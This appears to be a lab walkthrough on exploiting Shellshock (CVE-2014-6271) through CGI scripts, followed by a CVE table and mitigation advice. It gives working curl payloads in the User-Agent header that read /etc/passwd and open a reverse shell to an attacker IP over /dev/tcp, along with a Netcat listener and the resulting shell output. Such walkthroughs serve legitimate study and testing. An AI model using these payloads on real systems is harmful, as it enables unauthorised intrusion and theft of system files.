## CGI and Shellshock (CVE-2014-6271)

[CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271), known as Shellshock, is a critical remote code execution vulnerability in GNU Bash versions up to 4.3, first disclosed in September 2014.  Despite being over a decade old, it remains actively exploited in the wild, particularly against IoT devices and legacy web servers that have never been patched.  The RondoDox IoT botnet, still expanding as of late 2025, includes Shellshock in its 56-exploit arsenal targeting devices from D-Link, Netgear, TP-Link, and others. 
***

## How Shellshock Works

Bash allows functions to be stored as environment variables. A vulnerable version of Bash will execute any commands appended after a function definition during variable import, rather than stopping at the end of the function body. 

Test for vulnerability locally:

```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

On a vulnerable system, both strings print:

```
vulnerable-shellshock
not vulnerable
```

On a patched system, only `not vulnerable` prints because Bash no longer executes trailing code after a function definition. Patched Bash also no longer accepts `y=() {...}` as a function definition at all. Function definitions in environment variables must now be prefixed with `BASH_FUNC_`.

***

## Why CGI is the Attack Vector

When a web server receives a request for a CGI script, it sets HTTP headers as environment variables before invoking the script.  For example, the `User-Agent` header becomes `HTTP_USER_AGENT`. If the CGI script invokes Bash directly or indirectly, those environment variables are passed to a potentially vulnerable Bash instance, allowing the attacker to inject commands through any controllable header. 

The three main headers used as injection points are:

- `User-Agent`
- `Referer`
- `Cookie`

***

## Enumeration

Use Gobuster to fuzz the `/cgi-bin/` directory for CGI scripts. Always include the `.cgi` extension:

```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ \
  -w /usr/share/wordlists/dirb/small.txt -x cgi
```

```
/access.cgi  (Status: 200) [Size: 0]
```

Confirm the script is reachable:

```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

```
HTTP/1.1 200 OK
Content-Length: 0
```

An empty response does not rule out exploitation. The script may still invoke Bash internally.

***

## Confirming the Vulnerability

Inject a file read payload into the `User-Agent` header. The `echo ; echo ;` at the start ensures a blank line separates the injected output from HTTP headers, keeping the response clean:

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
  bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

If the system is vulnerable, the contents of `/etc/passwd` are returned directly in the response:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash
```

***

## Exploitation: Reverse Shell

Start a Netcat listener, then send the reverse shell payload in the same header:

```bash
sudo nc -lvnp 7777
```

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' \
  http://10.129.204.231/cgi-bin/access.cgi
```

```
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840

www-data@htb:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell arrives as `www-data`. From here, escalate privileges through the standard local enumeration path (SUID binaries, sudo rights, writable cron jobs, kernel exploits, etc).

***

## Shellshock CVE Family

The initial fix for CVE-2014-6271 was incomplete, leading to a cluster of related CVEs. All carry a CVSS score of 10.0: 

| CVE | Description |
|---|---|
| CVE-2014-6271 | Original Shellshock: trailing commands after function definition |
| CVE-2014-7169 | Incomplete fix bypass for the original issue |
| CVE-2014-7186 | Out-of-bounds memory read via crafted heredoc |
| CVE-2014-7187 | Off-by-one error in nested loops |
| CVE-2014-6277 | Use-after-free via malformed function definition |
| CVE-2014-6278 | Code injection via specially crafted variable value |

***

## Mitigation

The definitive fix is upgrading Bash to a patched version (4.3 patch 25 or later). On end-of-life Ubuntu or Debian systems, the package manager may need upgrading first before Bash can be updated. For IoT devices where patching is not possible: 

- Remove the device from any internet-facing exposure immediately
- Isolate it on the internal network using firewall rules
- Evaluate whether the device can be decommissioned or replaced
- Accept that firewall-only mitigation is a temporary measure and not a real fix

Nmap has a built-in script for detecting Shellshock that can be run during initial enumeration:

```bash
nmap -sV --script http-shellshock --script-args uri=/cgi-bin/access.cgi 10.129.204.231
```
